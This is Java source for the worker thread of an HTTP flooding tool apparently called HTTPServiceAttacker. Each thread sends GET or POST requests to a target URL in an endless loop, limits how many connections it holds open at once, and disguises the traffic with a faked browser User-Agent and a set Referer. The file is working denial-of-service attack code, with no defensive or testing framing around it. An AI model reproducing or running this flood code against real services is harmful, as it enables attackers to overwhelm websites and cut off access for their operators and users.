package com.ishland.app.HTTPServiceAttacker.attacker.threads;

import com.ishland.app.HTTPServiceAttacker.attacker.Attack;
import org.apache.hc.client5.http.async.methods.SimpleHttpRequest;
import org.apache.hc.client5.http.async.methods.SimpleHttpRequests;
import org.apache.hc.client5.http.async.methods.SimpleHttpResponse;
import org.apache.hc.core5.concurrent.FutureCallback;
import org.apache.hc.core5.http.ContentType;
import org.apache.hc.core5.http.message.BasicHeader;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

public class AttackerThread extends Thread {

    public static final byte GET = 0x00;
    public static final byte POST = 0x01;
    public static Long openedCount = 0L;
    private static int num = 0;
    private final Logger logger;

    private boolean isStopping = false;
    private String target = null;
    private byte method = GET;
    private String data = null;
    private boolean showExceptions = true;
    private String referer = "";
    private long startedCount = 0;
    private final FutureCallback<SimpleHttpResponse> callback = new FutureCallback<SimpleHttpResponse>() {

        @Override
        public void completed(SimpleHttpResponse httpResponse) {
            synchronized (this) {
                this.notifyAll();
            }
            operate(-1);
            startedCount--;
            try {
                MonitorThread.pushResult(httpResponse);
            } catch (NullPointerException | InterruptedException | IllegalArgumentException e) {
                if (showExceptions)
                    logger.warn("Internal error", e);
                MonitorThread.newError(e);
            }
        }

        @Override
        public void failed(Exception ex) {
            synchronized (this) {
                this.notifyAll();
            }
            operate(-1);
            startedCount--;
            if (showExceptions)
                logger.warn("Error while making request", ex);
            MonitorThread.newError(ex);
        }

        @Override
        public void cancelled() {
            synchronized (this) {
                this.notifyAll();
            }
            operate(-1);
            startedCount--;
        }

    };

    public AttackerThread() {
        super();
        num++;
        logger = LoggerFactory
                .getLogger("Attacker Thread - " + num);
        this.setName("Attacker Thread - " + num);
    }

    public void setShowExceptions(boolean showExceptions) {
        this.showExceptions = showExceptions;
    }

    private synchronized void operate(long count) {
        openedCount += count;
    }

    public void run() {
        logger.info("Starting " + this.getName() + "...");
        boolean isReady = true;
        boolean isError = false;
        if (target == null) {
            logger.error("Target must not be null");
            MonitorThread
                    .newError(new RuntimeException("Target must not be null"));
            isReady = false;
        }
        if (method == POST && data == null) {
            logger.error("You must set the data in POST mode");
            MonitorThread.newError(
                    new RuntimeException("You must set the data in POST mode"));
            isReady = false;
        }
        logger.info("Using " + (method == POST ? "POST" : "GET" + " to attack ")
                + target);
        logger.info(this.getName() + " started.");
        // System.out.println(Attack.replacePlaceHolders(this.target));
        // System.out.println(Attack.replacePlaceHolders(this.data));

        while (!isStopping && isReady) {
            if (startedCount > Attack.maxConnectionPerThread) {
                synchronized (callback) {
                    try {
                        callback.wait();
                    } catch (InterruptedException ignored) {
                    }
                    continue;
                }
            }
            operate(1);
            startedCount++;
            MonitorThread.newCreation();
            SimpleHttpRequest req;
            if (this.method == GET) {
                try {
                    req = SimpleHttpRequests.get(Attack.replacePlaceHolders(this.target));
                } catch (IllegalArgumentException e) {
                    if (showExceptions)
                        logger.error("Invaild target url", e);
                    MonitorThread.newError(e);
                    isError = true;
                    break;
                }
            } else if (this.method == POST) {
                try {
                    req = SimpleHttpRequests.post(Attack.replacePlaceHolders(this.target));
                    req.setBody(Attack.replacePlaceHolders(getData()), ContentType.APPLICATION_FORM_URLENCODED);
                } catch (IllegalArgumentException e) {
                    if (showExceptions)
                        logger.error("Invalid target url", e);
                    MonitorThread.newError(e);
                    isError = true;
                    break;
                }
            } else continue;
            req.setHeaders(new BasicHeader("User-Agent",
                            "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36"),
                    new BasicHeader("Referer", this.referer));
            Attack.httpClient.execute(req, callback);

        }
        if (!isReady) {
            logger.error("Exiting due to configuration error");
        } else if (isError) {
            logger.error("Exiting due to an error occured");
        } else {
            logger.info("Exiting due to termination");
        }
    }

// --Commented out by Inspection START (5/16/2020 11:19):
//    /**
//     * @return the isStopping
//     */
//    public boolean isStopping() {
//        return isStopping;
//    }
// --Commented out by Inspection STOP (5/16/2020 11:19)

    /**
     *
     */
    public void stopTask() {
        synchronized (callback) {
            callback.notifyAll();
        }
        this.isStopping = true;
    }

// --Commented out by Inspection START (5/16/2020 11:19):
//    /**
//     * @return the target
//     */
//    public String getTarget() {
//        return target;
//    }
// --Commented out by Inspection STOP (5/16/2020 11:19)

    /**
     * @param target the target to set
     */
    public void setTarget(String target) {
        this.target = target;
    }

// --Commented out by Inspection START (5/16/2020 11:19):
//    /**
//     * @return the method
//     */
//    public byte getMethod() {
//        return method;
//    }
// --Commented out by Inspection STOP (5/16/2020 11:19)

    /**
     * @param method the method to set
     */
    public void setMethod(byte method) {
        this.method = method;
    }

    /**
     * @return the data
     */
    public String getData() {
        return data;
    }

    /**
     *
     */
    public void setData(String data) {
        this.data = data;
    }

// --Commented out by Inspection START (5/16/2020 11:19):
//    /**
//     */
//    public void setShowExceptions(boolean showExceptions) {
//        this.showExceptions = showExceptions;
// --Commented out by Inspection STOP (5/16/2020 11:19)

// --Commented out by Inspection START (5/16/2020 11:28):
//    /**
//     * @return the referer
//     */
//    public String getReferer() {
//        return referer;
//    }
// --Commented out by Inspection STOP (5/16/2020 11:28)

    /**
     * @param referer the referer to set
     */
    public void setReferer(String referer) {
        this.referer = referer;
    }

}
